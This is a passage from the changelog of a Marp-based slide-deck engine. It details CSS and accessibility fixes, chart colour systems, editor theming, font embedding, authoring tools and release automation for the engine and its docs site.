  accent-soft background band (+ a thin accent left-border) — a colour-only
  cue that fails colour-blind viewers. It now triple-codes the active row:
  a **chevron pointer** in the left gutter (shape), the row **indents right**
  (position), the **label goes bold** (weight), and the background band stays
  (colour, for everyone who can see it) — plus the existing past/future
  opacity fade. Applies to every theme (clean chevron); the `sketch` finish
  draws a hand chevron and drops the active row's wavy rule so the pointer +
  band carry it. New `--agenda-marker` token holds the pointer SVG.
- **`sketch` finish — second audit pass (visible-defect fixes).** (1) **Wavy
  rules now read as hand-drawn** — the `--sketch-wave` amplitude was too low to
  perceive at slide scale, so table/ledger/agenda rules looked machine-straight;
  raised it so the wobble registers. (2) **Counters take the hand** — the
  numeral/step counters (`agenda`, `list`, `list-criteria`, `list-steps`) pinned
  `--font-mono`, so they stayed mono beside hand content; re-pointed them at
  `--font-label` (hand under `sketch`, identical mono everywhere else). (3)
  **Responsive guards so contained content stops overflowing under the wider
  hand font:** `list` rows step down to `--fs-body` to fit their equal-height
  bands (was overlapping); `split-panel` right-zone cards step to the compact
  size to fit the fixed panel (was clipping the last card); the `checklist`
  inter-row gap tightens so a 7-row set clears the footer. The principle: content
  that fit the engine face still fits; only a genuinely overstuffed slide
  overflows.
- **`sketch` finish robustness — a slide-by-slide audit of the finish on a
  full editorial deck fixed a batch of defects.** (1) **Dropped the `1.08em`
  body bump** — it enlarged every body element AND discarded the compact sizes
  dense layouts set (`--fs-body-compact`), overrunning fixed content budgets;
  it was the single biggest source of clipped slides (glossaries, tables).
  (2) **`--font-body` is now re-pointed as a token** under `sketch` (like
  `--font-display`/`--font-label`), so components that pin `var(--font-body)` on
  a nested element (big-number caption, key-insight body) get the hand sans
  instead of leaking the clean face; `sketch-clean-body` restores it via the new
  `--font-body-clean` alias. (3) **matrix-2x2 quadrants get the hand box** —
  the box selectors only matched `> ol > li`, missing the `ul`-based variant.
  (4) **The generic KEY INSIGHT blockquote** now becomes a drawn box like the
  cards/quote. (5) **No more synthetic italic on Caveat** — the quote face,
  which has no italic, was being slanted into a muddy oblique. (6) **Chart-frame
  slides no longer double-rule the heading** — the straight `.chart-header`
  hairline is suppressed (the hand wavy underline already draws it).
  (7) **list-principles dividers** join the wavy-rule family. Genuinely
  over-budget slides (a 3-card split-panel, a 4-state verdict-grid) still want
  `sketch-clean-body`; kpi separators + the cuoio dark-accent tone are noted
  follow-ups.
- **Inline `code` chips no longer fragment on hyphenated tokens.** `section code`
  gained `white-space:nowrap`, so an identifier like `--bg-alt` stays on one line
  instead of breaking to `--`/`bg-`/`alt` inside the chip (worst under the wider
  hand font, but a latent bug on every deck). Matches the state-pill, which
  already nowraps.
- **Committed deck PDFs embed the real fonts, even on a network-less render.**
  The emulator pulled its type from a Google-Fonts `<link>`/`@import`, so a build
  without network (the cloud sandbox, the pre-commit PDF rebuild) embedded a
  serif/sans **fallback** — the committed `.pdf`s (e.g. `examples/sketch.pdf`)
  shipped looking nothing like the design, and the page-count tests never caught
  it. `lattice-emulator.js` now base64-injects the full self-hosted type stack
  (`assets/fonts/` — Playfair Display incl. italics, Outfit, JetBrains Mono, and
  the `sketch` pair Caveat + Shantell Sans) as an inline `@font-face` block that
  wins over the `@import`, and waits on `document.fonts` before printing, so PDFs
  embed every face with no network — a network-less render is now the intended
  design, not a fallback. The shipped npm bin doesn't carry `assets/` (excluded
  from the tarball), so end users still resolve fonts from Google unchanged.
- **The Drawing Board editor mounts again.** The editor-mount script read the
  `autocomplete` workspace preference via `getPref(...)` but never imported it
  into that `<script>` module — and each Astro `<script>` is its own ES module,
  so the call threw `getPref is not a function` before CodeMirror mounted. The
  editor pane came up blank (the hidden no-JS seed textarea masked nothing once
  `html.db-js` was set). Fixed by importing `getPref` into the editor-mount
  block. Docs-site Drawing Board only — no engine change.
- **Editor cursor-line and selection highlights now read clearly on every palette
  and mode.** Both were a flat low-alpha wash of `--accent` (active line 6%,
  selection 22%), which left the cursor line near-invisible everywhere (WCAG
  band-contrast ~1.06–1.16) and the multi-line selection faint on the low-chroma
  and warm light palettes. The active line bumps to a visible band (12% — alpha
  far too low to touch text legibility), and the selection keeps its legibility-safe
  22% fill but gains a 1px `--accent` edge for definition a heavier fill can't buy
  without dimming code. The four values are now named tokens on the editor
  (`--cm-active-line`, `--cm-active-gutter`, `--cm-selection`, `--cm-selection-edge`,
  `--cm-match`) so a downstream theme can tune them. Playground / Drawing Board /
  Specimen editors (docs-site CodeMirror) only — no engine change.
- **Editor autocomplete popup is now legible on every palette and mode.** The
  dropdown reused `--bg` (identical to the editor) with a plain `--border` edge,
  so in light mode it floated with almost no visible boundary (border-vs-bg ~1.21
  on indaco-light); and the completion detail/type hint reused `--text-muted`,
  which drops to WCAG ~2.5 on the warm light palettes (magnolia, cuoio). Two new
  editor tokens fix both: `--cm-pop-border` (a muted-blended panel edge, lifted to
  ~1.87) and `--cm-detail` (a body-blended hint colour, lifted to ~3.85 while
  staying secondary to the label); the popup shadow is also deepened for
  elevation. Docs-site CodeMirror only — no engine change.
- **The editor autocomplete popup no longer renders as an unthemed white box
  (notably on iOS Safari).** The popup theme lived in the editor's scoped
  `EditorView.theme`, but CodeMirror renders completion tooltips in a
  fixed/detached layer that can fall outside the `.cm-editor` element, where the
  scoped rules don't reach — so the popup fell back to CodeMirror's default white
  panel, jarring on the dark editor. The theme now lives in a global stylesheet
  injected once (using the base palette tokens, which resolve anywhere under
  `<html>`; the editor's `--cm-*` tokens are scoped to `.cm-editor`). Drawing
  Board (docs-site) only.
- **The editor's first text selection on iOS Safari now uses the themed
  highlight, not the system tint.** iOS could paint the native (lavender)
  selection before applying CodeMirror's injected theme, so the first selection
  read wrong until a style recalc (e.g. a palette/mode toggle). The editor now
  forces one reflow on the frame after mount, applying the theme up front.
  Docs-site CodeMirror only.
- **The AI-tier status indicator no longer relies on colour alone (WCAG 1.4.1).** The
  green/grey connectivity dot — on the model chip and the settings "In use" row — is
  replaced by a per-state **Lucide glyph**: `cloud` (cloud tier) · `cpu` (on-device) ·
  `circle-slash` (off/floor) · `loader-circle` (reconnecting, spins, honors
  `prefers-reduced-motion`) · `triangle-alert` (load failed). The shape conveys the
  state, so it reads for colour-blind users; colour (accent/muted) is now a secondary
  cue. Bonus: the glyph names *which* tier is live at a glance. Drawing Board (docs-site) only.
- **You can reconnect OpenRouter from Settings.** After disconnecting, the Cloud AI
  section said "Open Converse to connect" but offered no control — leaving no obvious
  way back. It now has a **Connect OpenRouter** button (one-click OAuth), symmetric
  with Disconnect. Drawing Board (docs-site) only.
- **The spend readout no longer shows a misleading "$0.00 all-time".** The local
  tally can only count since the feature shipped on this device, so an all-time
  figure contradicted the real OpenRouter account total. The strip now shows the
  **authoritative account `used`/`left`** plus an honest **"This session: $X"** live
  tally — no phantom all-time. Drawing Board (docs-site) only.
- **`list-tabular`'s authoring skeleton no longer teaches a removed inline format.**
  Its `skeleton` (the scaffolder template, the docs "Authoring" block, and the
  Converse dossier's base) still showed the retired `- **Name.** description`
  ledger form — dead authoring that survived only because `list-tabular` isn't a
  card-style layout, so the inline-bold lint gate never fired on it. The skeleton
  and the `rows` slot contract now match the numbered/nested form the layout
  actually renders (and that its own `sample` and variants already use):
  `1. Name` + an optional nested `- description` row. Regenerates
  `dist/docs/components.{md,json}`.
- **Map region autocomplete now defaults to the world basemap.** The editor's
  `map` region completer inverted the component's default — a bare
  `<!-- _class: map -->` (a world map) offered US states, so every country and
  group (Global South, blocs, continents) was unreachable unless the author
  typed a redundant `world` token `map.docs.md` tells them to omit. It now
  matches the grammar: world by default, US states only on `map us` / `map usa`.
  Drawing Board (docs-site) only.
- **Drawing Board drawer close buttons are right-aligned again.** The flex
  spacer that pushes the `×` to the end of a drawer head was scoped to
  `.db-panel-head` only, so inside the Settings and Decks drawers
  (`.db-drawer-head`) it collapsed and the close button jammed against the
  title. The `.db-spacer` grow rule is now unscoped (a spacer grows in any
  flex row). Drawing Board (docs-site) only.
- **OpenRouter model picker no longer shows `$-1000000.000/M` for
  variable-priced models.** OpenRouter reports a `-1` sentinel for router/auto
  and other variable-priced rows; the picker multiplied it into a nonsense
  per-million figure. Pricing now parses through `orPricePerM`, which maps any
  negative/missing/non-numeric value to “no fixed price” (the option reads
  “pricing varies”) while keeping `0` as a genuine free model. Drawing Board only.
- **Mid-sentence inline code is no longer mis-promoted to a metadata pill.**
  The universal pill rule matched `code:has(+ :is(ul, ol))`, but the `+`
  combinator skips text nodes, so a mid-sentence reference on a row that merely
  had a nested list (`- The \`--accent\` token does X\n  - detail`) was styled
  as a pill. A new `pill-tag` transformer (shared across marp-cli, emulator,
  and runtime) tags only the genuine trailing-`code`-before-a-nested-list case
  with `.lat-pill`, and the CSS arm now matches that class; the `:last-child`
  pill (a truly trailing `code`) is unchanged. See
  `engineering/decisions/2026-06-08-inline-code-contrast.md`.

- **Docs site search boxes no longer trigger iOS Safari's focus-zoom.** The
  playground component search, the component-reference search, and the Group-by
  selects were below the 16px threshold that makes iOS zoom the page on focus;
  they now bump to 16px on coarse pointers (matching the editor textarea), so
  tapping search keeps the layout put.
- **Docs playground no longer renders `math` slides tiny + jittering.** The
  playground renders `inlineSVG:false` (bare `<section>`, no
  `<svg><foreignObject>` wrapper), and `section{container-type:size}` collapses
  a section that has no explicit box — so cqi/cqh-based layouts (notably
  `math.matrix` / `math.compare`) shrank to an unreadable size and visibly
  re-scaled as the KaTeX stylesheet streamed in async. `writeFrame` now pins
  each slide to its intrinsic 1280×720 (matching the specimen renderer), giving
  container queries a definite box and making the fit-to-width scale
  deterministic. PDFs were never affected.

- **Accent-filled surfaces now stay legible on pale-accent palettes.** Text on
  `var(--accent)` fills was reaching for a fixed light ink (`--on-dark*` /
  hardcoded `#fff`), which vanished whenever a theme's accent is pale (every
  palette's dark mode, plus achromatic palettes like concrete/atelier/ardesia).
  - The `--on-accent` muted tiers (`-secondary` / `-ghost` / `-watermark`) now
    **derive from each theme's curated `--on-accent`** by opacity instead of
    re-deriving from white, so the whole rail inherits the per-theme contrast
    tuning and overriding `--on-accent` alone carries the rest.
  - `split-compare` verdict (recommendation) bar, `split-list` panel heading +
    slide header/footer, and the `pinned` corner tag now read the accent pair
    instead of a light-on-dark ink.
  - The docs site projects `--on-accent` per palette/mode; the landing **Try it
    in your browser** CTA and the playground **Preview** toggle now use it, so
    their label no longer disappears on a pale accent.
- **Layout audit — T6 hex-fallback hygiene (audit round 2).**
  - `cards-grid`, `cards-side`, `cards-stack`, `split-list`, `timeline`:
    numbered-badge `::before` color changed from `var(--on-accent, var(--on-dark-primary, #fff))`
    to `var(--on-accent, var(--on-dark-primary))` — drops the `#fff` literal floor so the
    fallback chain bottoms out in a palette token.
  - `before-after` / `decision` / `compare-prose` corner-tag (flush + banner-tag variants):
    `before-after` / `banner-tag.before-after` label text changed from
    `var(--on-accent, var(--on-dark-primary, #fff))` → `var(--on-accent, var(--on-dark-primary))`.
    `decision` corner tags changed from `var(--on-cat, #fff)` → `var(--c-ink-dark)`:
    `--on-cat` is undefined (always resolved to `#fff`); `--c-ink-dark` (white on light,
    near-black on dark) is the correct text token for fills backed by `--cN-dark`
    (which are saturated on light canvas, pale on dark canvas).

- **Layout audit — T4 SVG chart label sizes (audit round 2).**
  - `radar`: axis labels raised from `9px` (≈6.4pt) to `11px` and tick marks from
    `6.5px` (≈4.6pt) to `9px` via scoped `--radar-axis-label-size` / `--radar-tick-size`
    custom properties with a bypass comment explaining SVG-unit sizing. Tick
    `font-weight` raised from 500→600 (matching the cover-variant's existing lift)
    so the faint sub-token-size ring labels get extra stroke weight.
  - `quadrant`: axis name raised from `11px` to `12px` and tick labels from `8px`
    (≈5.7pt) to `10px` via scoped `--quadrant-axis-size` / `--quadrant-tick-size`
    custom properties with bypass comment.

- **Layout audit — T5 dark-mode contrast fixes (audit round 2).**
  - `journey`: section-bar labels (`--journey-section-fg`) were `var(--on-accent)`,
    which flips to `--bg-dark` (navy) in dark mode — near-zero contrast against the
    dark bar. Changed to `var(--on-dark-primary)` (always-light token) for legible
    labels on both canvases.
  - `journey`: mood-legend numbers were `0.78125cqi` + `opacity:0.65` — compounded
    sub-token size and opacity fade made the 1–5 scale illegible. Raised to
    `var(--fs-meta)` (11.25pt) and `opacity:0.85`.
  - `journey`: hex `#fff` fallback on actor-dot color replaced with token floor
    `var(--on-dark-primary)`.
  - `agenda`: past rows at `opacity:0.4` on a dark canvas are near-invisible,
    flattening the past/active/future three-state hierarchy. Added a `section.dark`
    scoped bump: past rows → `0.55`, future rows → `0.65`, preserving the hierarchy
    while meeting minimum legibility.
  - `word-cloud`: dark-mode palette routed to `--catN-hue` (full-saturation
    categorical hues) by overriding `--catN-ink` tokens within `section.dark.word-cloud`.
    Previously `--catN-ink` dark branch was `color-mix(hue 78%, white)` which reads
    as pastel against navy; now the direct hue tokens give an analytical, vivid palette.
  - `compare-code`: column labels (`BEFORE`, `AFTER`) used `--text-label` which in dark
    mode drifts to a pale muted value, losing the accent-color signal that identifies
    each column. Changed to `var(--accent)`, which stays vivid in both themes and
    both canvases.

- **Layout audit — cross-component consistency (audit T-misc).** `stats` metric
  numbers now use the display serif (`--font-display`), matching `big-number` /
  `kpi` / `split-metric` (they were the lone sans outlier); `split-compare`'s
  preferred-option marker is now `✧`, matching `verdict-grid`'s focal glyph.
- **Layout audit — round 1 of fixes (anatomy, contracts, P0 render bugs).**
  - `kpi`: the running header overprinted the eyebrow on every slide with an
    `### eyebrow` (the section `padding-top` coincided with the absolute
    header's `top`); content now clears the header band.
  - `closing`: the heading styling targeted `h2` while the slot is `h1`, so the
    bookend lost its centering / max-width and the eyebrow rendered below the
    heading. Now mirrors `title` (centered hero `h1`, eyebrow reordered above).
  - `content`: stopped top-aligning (dead lower half) — now vertically centred —
    and capped paragraph/list line length so prose doesn't run ~90 chars wide.
  - `actors`: a 5-row roster clipped its last row off the slide bottom
    (`justify-content:center`); rows now top-align and stay on-canvas.
  - `list-tabular` `spec` / `spec+stacked`: the key name and the type both
    landed in one grid cell (overlapping glyphs) and overflowed the right edge;
    the key now sits in the name column, the type in the trailing column, and
    long mono keys/API paths wrap inside their cell.
  - `tldr` `numbered`: an inline `code` span in a takeaway fragmented the line
    across rows (grid blockified it); the counter is now a hanging indent so the
    takeaway flows as one line.
  - `piechart`: the disc was locked at `25cqi` and floated small in dead space;
    enlarged to `32cqi` (`36cqi` under `cover`) so the proportions read.
  - `redline` `three-col` / `split`: a long clause clipped mid-word; the content
    row is now `minmax(0,1fr)` with an overflow guard so it stays on-slide.
  - `citation-card`: the base "KEY INSIGHT" blockquote chrome contaminated its
    verbatim-quote panel on every non-pull-quote variant (light + dark) —
    citation-card is now excluded from that rule (it styles its own
    blockquote); the `pull-quote` watermark glyph was sunk behind the canvas
    (`z-index:-1`) and is now a visible watermark; and the `triptych` sample
    only supplied one gloss item so it rendered two panels — it now carries the
    translate + obligation items the three-panel layout expects.
  - **`diagram` dark mode — round 2 (per-diagram, scoped).** Fixed four more
  dark-mode surfaces, each scoped to its diagram type (no broad selectors):
  sequence lifelines + journey axis re-pointed at `--c-line`; mindmap branch
  edges restored to their per-section category colour, brightened via
  `color-mix` (an earlier over-broad edge rule had flattened them to mono);
  ER entity boxes levelled to `--bg-alt` on `section.dark` so header + attribute
  cells read with light ink. Light mode unchanged across all four.
- **`diagram` dark mode** — Mermaid bakes `edgeLabelBackground` and label ink
    as resolved hex at render time (in the light color-scheme), so on a dark
    slide flowchart/state/ER edge & relationship labels rendered as glaring
    white knockout boxes, sequence message text went invisible, and the edge
    LINES + arrowheads (baked #333) nearly vanished (dark-on-
    dark). `mermaid.css` now re-points those surfaces at `light-dark()` tokens
    (`var(--bg)` / `var(--c-ink-light)` / `var(--c-line)`) that resolve per the
    slide's color-scheme — identical on a light slide (no regression), correct
    on a dark one.
  - `state-chart`: the `lr` (horizontal) layout overran the slide and clipped
    the terminal node/marker at 5 states (a static PDF can't scroll) — tighter
    LR gutters fit the documented 4–6 node range; the `curved` variant clipped
    its terminal ◉ at the bottom — tighter vertical rhythm brings it on-canvas.
  - `roadmap`: phase date pills were white-on-pale in dark mode (the
    categorical `--cN-dark` fill flips pale on a dark canvas, but the ink stayed
    white) — a WCAG-AA failure on every dark variant. Pills now use
    `var(--c-ink-dark)` (white on the saturated light-canvas fill, near-black on
    the pale dark-canvas fill).
  - **Docs/contracts:** corrected ~22 `## Anatomy` diagrams that depicted a
    different layout than what renders (split-statement, split-brief, decision,
    timeline-list, list-steps, kpi, split-metric, math, image, featured,
    glossary, roadmap, progress, statute-stack, authority-chain,
    regulatory-update, tldr; added one for state-chart; dropped the dead
    `── accent ──` rule from title/divider/closing). Fixed misleading manifest
    contracts: `principles` skeleton (was `- **bold**`, generating card-style-
    invalid slides) + dropped its non-existent "justification" slot;
    `kpi`/`stats` list selectors (`ul`→`ol`) and kpi slot name; `split-list`
    `related` text; `authority-chain` `links`→`tiers` slot.

- **Subtitle / secondary-text contrast was broken across every theme.** The
  subtitle, eyebrow, caption, table-header, sub-label and attribution roles
  all rode the decorative, contrast-exempt `--text-muted` token, which is a
  single static value that never tracked the canvas — so secondary text fell
  below WCAG AA in most themes (and hard-failed in cuoio, magnolia, and on the
  dark canvas in concrete). They now use the new `--text-secondary` tier (AA on
  both canvases). The stale comment claiming `section.dark` "already remapped"
  `--text-muted` (it never did) was corrected. See
  `engineering/decisions/2026-06-05-token-structure-audit.md`.
- **Dark-panel text was invisible on every theme except cuoio.** The
  `--on-dark-*` opacity ramp (and the `--hljs-*` syntax fallbacks) were
  declared in a `:where(:root)` block. Marp/Marpit only rewrites a *bare*
  `:root`/`section` onto the slide `<section>`; wrapped in `:where()` it
  prefixes the slide path as a descendant, producing a "section inside a
  section" selector that never matches — so those tokens were **undefined in
  every rendered slide**. No-fallback consumers (`color:
  var(--on-dark-secondary)` on `title`/`closing`/`divider` and every split-*
  dark panel) then collapsed to the inherited dark body ink — invisible on
  dark surfaces — for all 12 themes that don't locally redefine the ramp
  (cuoio was the only one that did, which masked the bug). Moved the block to
  a plain `:root`; palette overrides still win by source order. Fixes title
  eyebrow/subtitle contrast and the blank left panel on `split-statement`,
  `split-brief`, `split-compare`, `split-metric`, and `split-list`.
- **`cards-wide` rendered all-bold and `featured` collapsed in the Marp
  preview / runtime path.** Both layouts styled their raw-markdown form behind
  a `:not(:has(.three-stack))` / `:not(:has(.feat-layout))` guard, which is
  silently broken in the Marp preview Chromium (see `engineering/gotchas.md`)
  — dropping the rules that reset body weight and build the card frames. The
  transformed and raw forms are mutually exclusive per render, so the guard
  was unnecessary: removed it, and the rules now apply unconditionally with no
  `:has()` dependency, so the layouts render in all three paths.
- **`content` lists rendered bulletless and undersized.** The layout styled
  only `<p>`, so an authored list (which `content.docs.md` permits) fell to
  base list styling — markers stripped, a size below the prose beside it.
  Added list styling at the prose tier with accent markers.
- **Mermaid radar (`radar-beta`) curves now ride the engine `--cN` palette.**
  The override block was a legacy two-curve hard-code (`--accent` /
  `--c-accent-warm`) living in the *native* radar component's stylesheet even
  though it styles *Mermaid* output. It now lives with the other Mermaid type
  overrides in `mermaid.css` and paints each series from `--c1-dark`…`--c8-dark`,
  so a radar with up to eight curves gets distinct, theme-flavoured colours that
  flip per canvas — not two fixed brand accents.
- **Pie wedge borders were off-by-one from their fills.** The piechart SVG
  emits `<defs>` (per-wedge gradients) as its first child, so the
  `nth-child`-based border palette counted from the wrong slot — every wedge's
  border took the *next* hue, and the 5th wedge landed on `--cat6` rose,
  painting a stray red line at the 12-o'clock seam. Wedge borders now count by
  `nth-of-type` (paths only). See `engineering/gotchas.md`.

### Added

- **Chart-family semantic colour system (`--state-*`).** Status-driven charts
  — gantt bars, progress fills, the shared status pills, kanban's "done"
  column, and the state-chart / timeline-list pills — now draw from a
  chart-exclusive semantic palette (`--state-{pass,warn,fail,info,mute}-{hue,
  fill,ink}`) instead of the engine-wide `--pass/--warn/--fail`. Curated to
  convey meaning (green / amber / red / blue / gray) and built like the catN
  spectrum: canvas-aware fill + ink via `light-dark()`, vivid on both modes.
  Gantt + progress bars fill with the same **hue-into-`bg` depth gradient** the
  pie / quadrant / radar SVG charts use (those read rich precisely because they
  gradient-fill ~42–82%, not a flat 24% tint — which is why the bars used to
  look muted). The gradient is capped where the shared `--text-heading` label
  still reads, so on-bar text flips the normal way (dark on light, light on
  dark), coherent with every chart in each mode. Radar's gap / delta segments
  move onto `--state-pass-ink` / `--state-fail-ink` too. Theme-overridable via
  `--chart-state-*`. The old per-`.dark` status overrides collapse into single
  canvas-aware rules.
- **Kanban cards are now swim-lane tiles.** Each card's background is a
  depth gradient of its own lane colour (same hue-into-bg language as the bars/
  zones, in the same richness band so kanban no longer reads pale), so a card
  reads as its lane. The lane tag drops its chip fill and becomes a quiet dot +
  neutral label, leaving the gradient status pill as the one loud chip on the card.
- **Status pills + gantt/progress bars share one depth-gradient recipe.** A
  status reads identically as a pill or a bar (hue-into-bg gradient, vivid ink
  border, `--text-heading` label).
- **Kanban lanes + word-cloud now ride the vivid catN spectrum.** Both moved
  off the engine `--cN` palette onto `--catN-ink`, so categorical colour reads
  consistently with pie / quadrant / radar across the whole chart family.
  (catN tokens are now also defined on `section.word-cloud`, which isn't a
  chart-frame member.)
- **New `canvas` modifier — opt into the chart surface panel.** Charts now sit
  directly on the slide by **default** (bare); add `canvas` to lift the chart
  onto its surface panel (`<!-- _class: piechart canvas -->`). Lets a deck mix
  canvas and non-canvas charts per slide; composes with `dark`. Pure CSS on
  `section.chart-frame.canvas:not(.state-chart) .chart-body` (and
  `section.word-cloud.canvas` for the free-floating word-cloud).
- **New `cover` modifier — a chart-family full-bleed with a caption band.**
  `cover` is a **chart-scoped** modifier (registered as a `cover` variant on the
  charts that support it — radar, piechart — *not* an all-layout universal). It
  takes the chart edge-to-edge, hides the header/footer, and reflows the slide
  heading + a one-line takeaway into a bottom **caption band** carrying the chart
  surface "sheen" (a `--text-heading`→`--bg` radial wash with a hairline edge),
  the page number reading through it. The generic treatment lives in
  `section.chart-frame.cover` (chart-family.css); per-chart rules tune the figure
  (radar centres the diagram + keeps a responsive legend column). Other
  chart-frame members can opt in as they're given an explicit cover figure size.
  Distinct from image's `full` photo variant (unchanged — see below). Documented
  via the radar/piechart `variantDocs`. Pure CSS — no transform/render-path
  change.
- **Chart surface panels — opt-in `canvas`, real glass not a tinted box.**
  Charts are **bare by default** (sit directly on the slide); the `canvas`
  modifier lifts a framed chart-family member onto a glass surface at
  editorial-whisper intensity. The fill is **never** a `--text-heading` mix:
  that token is a
  neutral gray, so mixing it into `--bg` painted a muddy gray box that read as
  a second background on the slide, not glass. Instead the pane tints toward
  white-frost and the form is carried by light on the edges + a shadow: on a
  LIGHT slide the pane is left **clear** (the slide shows straight through —
  no second background — read from a soft dark float shadow + a crisp hairline
  edge + a white top rim), and on a DARK slide it's a translucent **white
  frost veil** (lighter than the canvas) with a luminous edge. `light-dark()`
  picks the right one. Pure CSS on
  `section.chart-frame.canvas:not(.state-chart) .chart-body`. The float shadow is
  always black-based — `--text-heading` flips to white on dark and would cast
  a white glow / double-frame that bleeds over the footer. No `backdrop-filter` blur — unreliable in
  print-to-PDF and there's only flat `--bg` behind the pane, so it would cost
  risk for no payoff. The decoration is pinned to `.chart-body` — the one
  fixed-width container every member shares — so the panel is the **same size
  on every chart** rather than hugging each figure. Covers radar, quadrant,
  piechart, progress, gantt, kanban, and timeline-list. **word-cloud** gets the
  same surface via a `::before` painted behind its free-positioned words (it
  isn't a chart-frame member, so the family rule can't reach it). **state-chart
  is excluded** — its state flow fills the full chart-body height, leaving no
  room for a panel inset. The panel also takes a top margin so the
  `.chart-header::after` accent divider floats in the whitespace above the card
  instead of colliding with the lifted card's top edge.
- **state-chart gallery defaults to `lr`.** The default / dark / compact /
  accent demos now render left-to-right at five states (was a six-state
  top-to-bottom flow that overran the slide). The `lr` direction reads the
  machine as a horizontal pipeline and fits comfortably; the gallery and the
  manifest `sample` (which drives the chart bucket survey) are updated to
  match. No engine change — `lr` was already a supported modifier.
- **Apple-inspired categorical chart spectrum, decoupled from `cN`.** The
  chart-family (quadrant, piechart, radar, progress) now draws from its own
  vivid, well-spaced 8-hue spectrum — `--catN-hue` with an Apple-style master
  set whose dark-canvas value is a brighter same-hue sibling — instead of the
  engine-wide `cN` accents (which still drive roadmap / journey / legal /
  decision). The spectrum is theme-overridable via `--chart-catN` (a `:root`
  `light-dark()` pair); untuned themes inherit the master. Radar previously
  hardwired its `RADAR_PALETTE` to `cN` and so missed the shared model — it
  now consumes `--catN-hue` like its siblings.
- **Area-fade gradients on categorical charts.** Radar polygons, piechart
  wedges, and quadrant regions now carry a restrained SVG gradient — an
  Apple-Stocks-style area fade (near-transparent at the centre, denser toward
  the data rim on radar; pie wedges deepen from a light hub toward a vivid rim;
  quadrant regions share one radial centre at the axis crossing — faint where
  the axes meet, richer toward the outer corners). Built as per-shape
  `<linearGradient>`/`<radialGradient>` defs (SVG `fill` can't take a CSS
  gradient) with `stop-color` riding `--catN-hue`/`--catN-fill` so they still
  flip with the canvas. Landed in all three render paths (marp-cli, emulator,
  runtime) via the shared `lib/` transforms.
- **Global font-scale modifiers `scale-l` / `scale-xl` / `scale-2xl`.**
  Bump the readable fonts on a slide up in lockstep (×1.15 / ×1.3 / ×1.5)
  without re-picking sizes. A new unitless `--fs-scale` multiplier
  (default `1`) is baked into ten of the twelve typography tokens and the
  three documented between-token raw-cqi sites, so body, supporting
  headings (h3–h6), hero, and chrome all grow together and the tuned
  proportions hold. `--fs-h1` and `--fs-h2` are exempt — slide titles (and
  the KPI/stats numbers and table/chart headers that reuse those tokens)
  hold their designed size so titles don't balloon. Scope is native Marp class
  scoping: `<!-- _class: scale-xl -->` for one slide, `class: scale-xl` in
  the front matter for the whole deck. Composes with any layout or
  variant. See `engineering/typography.md` §7 and `lib/base/base.docs.md`.
- **`obligation-matrix` `pills` and `lanes` variants are now documented.**
  The variants are declared in the manifest; this adds their `variantDocs`
  so they render in the component gallery and surface in the reference and
  search index instead of being declared-but-invisible.
- **Agent authoring affordances.** Three additions help AI agents author
  decks correctly: a machine-readable catalog `dist/docs/components.json`
  (every component's axes, tags, slots, skeleton, and when/anti/related
  prose plus the controlled vocabularies, generated alongside
  `components.md/.html`); a draft-deck linter `npm run lint:deck -- <file>`
  (`tools/lint-deck.js` → `lib/authoring/lint.js`) that flags the markdown
  footguns — card-style inline-title, ordered-list bold, class typos — as
  structured, no-render diagnostics (wired into the pre-commit hook on
  staged decks and into CI via `npm run lint:deck:all`; errors block,
  unknown-class warnings are surfaced but non-blocking); and a
  vendor-neutral `AGENTS.md` entrypoint pointing agents at
  `design/skill.md`, the catalog, and the linter. See
  `design/design-system.md` §7.
- **Searchable component tags.** Every component manifest now declares a
  `tags` field (3–5 entries) — the *searcher's* vocabulary, complementary
  to the Function/Form/Substance axes. Tags are drawn from a controlled
  vocabulary (`TAG_GROUPS` in `lib/components/index.js`) across four
  dimensions (idiom, occasion, material, task) and must not restate the
  component's own axis values. They surface in each `<name>.docs.md`, the
  aggregated `dist/docs/components.md`, and as chips + a live filter facet
  in `dist/docs/components.html` (the portal filter now matches tags as
  well as name and description). `tools/check-ownership.js` gains a
  `checkTagClustering` guard that fails on un-allow-listed singleton tags
  and dead vocabulary, so the facets stay clustered. See
  `design/design-system.md` §7.
- **`dist/` is now a self-contained distribution.** It ships the bundled
  emulator CLI (`dist/lattice-emulator.js`, esbuild bundle of the engine
  graph — the package `bin`/`main`/`.` now resolve to it) and a generated
  `dist/README.md` indexing the folder, alongside the existing CSS/runtime
  bundles and the canonical component reference. A `npm run release:zip`
  target packages the full offline-browsable showcase (engine + themes +
  examples + gallery PDFs) for GitHub Releases.
- **Automated, changelog-driven releases.** The **Release** workflow
  (`workflow_dispatch`) derives the semver bump from this `## Unreleased`
  section (`tools/changelog.js`), rolls it into a dated section, tags,
  pushes, and publishes a GitHub Release with notes + the showcase zip
  (`tools/release.js`). `npm run release` / `release:dry` run it locally.
- **Documentation site.** A public Astro Starlight site under `docs/`
  (intro, getting started, authoring and theming guides) deployed to
  GitHub Pages via `.github/workflows/docs.yml`. Branded with the
  Lattice palette (indaco accent, Playfair/Outfit/JetBrains Mono).
- **Component reference portal.** `tools/build-docs-portal.js`
  aggregates every component manifest into a single canonical reference
  in two forms: `reference/components.html` — a self-contained, themable
  two-panel portal (clickable bucket→component sidebar with scroll-spy
  and live filter; a palette dropdown previews the catalog in any of the
  shipped palettes, light or dark, resolved from `themes/<name>.css`) —
  and `reference/components.md`, the plain-Markdown edition. Wired as
  `npm run docs:portal` with a `--check` gate; a lefthook job keeps it
  fresh against the manifests.

- **Custom deck logo.** Author-supplied SVG/PNG/JPEG renders as a
  discreet top-right watermark on every slide. A build-stage rewriter
  injects `<img class="deck-logo">` as the first child of each
  selected `<section>`; CSS desaturates the img to a faint grayscale
  watermark via `filter`, with brightness inverted on dark-canvas
  layouts (`.title`, `.divider`, `.closing`, `.dark`) so the mark
  stays legible without per-author light/dark variants. Real DOM
  (rather than a `::before` pseudo) lets the logo compose with every
  treatment, tints and marks alike. Three render
  paths: `applyDeckLogoToHtml` in `marp.config.js` (marp-cli), the
  same helper called from `lattice-emulator.js`'s post-render pass
  (emulator), and `applyDeckLogoFromFrontMatter` in
  `lattice-runtime.js` (published HTML). `logo-style: brand` keeps
  the logo's original colours on a soft `--bg-alt` plate;
  `logo-on: title` restricts the mark to the cover slide.
  Build-time-only — does not render in marp-vscode preview because
  the extension doesn't load workspace `marp.config.js` plugins;
  same constraint as `class: dark`. See
  `lib/base/base.docs.md § Custom logo` and `examples/custom-logo.md`.

### Fixed

- **Inline code now escapes HTML.** `parseInline` in
  `lattice-emulator.js` was wrapping backtick spans in `<code>` tags
